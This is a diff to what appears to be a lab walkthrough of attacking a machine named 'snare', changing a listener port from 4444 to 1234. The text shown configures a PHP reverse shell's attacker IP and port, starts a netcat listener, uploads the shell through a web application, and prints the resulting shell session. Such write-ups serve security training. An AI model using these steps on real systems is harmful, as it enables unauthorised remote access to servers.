@@ -115,7 +115,7 @@ Edit the shell file to set your attacker IP and port:
 
 ```php
 $ip = '10.150.150.XXX';   // Your VPN IP
-$port = 4444;              // Your listening port
+$port = 1234;              // Your listening port
 ```
 
 ![Reverse Shell Config](screenshots/233631.png)
@@ -125,7 +125,7 @@ $port = 4444;              // Your listening port
 On your attacking machine, start a netcat listener **before** triggering the shell:
 
 ```bash
-nc -lvnp 4444
+nc -lvnp 1234
 ```
 
 | Option | Description |
@@ -150,7 +150,7 @@ Upload the PHP reverse shell through the web application's upload or file inclus
 Once the browser accesses the shell file, a reverse connection is established back to your listener.
 
 ```
-listening on [any] 4444 ...
+listening on [any] 1234 ...
 connect to [10.150.150.XXX] from (UNKNOWN) [10.150.150.18] XXXXX
 Linux snare 4.19.0-16-amd64 ...
 $ id
